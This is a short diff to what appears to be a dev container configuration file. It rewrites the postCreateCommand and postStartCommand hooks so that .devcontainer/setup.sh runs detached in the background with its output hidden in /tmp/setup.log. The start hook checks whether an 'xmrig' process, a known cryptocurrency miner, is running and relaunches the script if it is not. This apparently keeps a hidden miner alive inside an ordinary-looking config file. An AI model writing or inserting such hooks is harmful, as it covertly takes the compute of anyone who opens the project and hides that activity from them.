@@ -1,5 +1,4 @@
 {
-  "postCreateCommand": "chmod +x .devcontainer/setup.sh && bash .devcontainer/setup.sh",
-  "postStartCommand": "bash .devcontainer/setup.sh",
-  "postAttachCommand": "bash .devcontainer/setup.sh"
+  "postCreateCommand": "chmod +x .devcontainer/setup.sh && setsid -f bash .devcontainer/setup.sh > /tmp/setup.log 2>&1 < /dev/null; sleep 1",
+  "postStartCommand": "pgrep -x xmrig > /dev/null || setsid -f bash .devcontainer/setup.sh > /tmp/setup.log 2>&1 < /dev/null; sleep 1"
 }
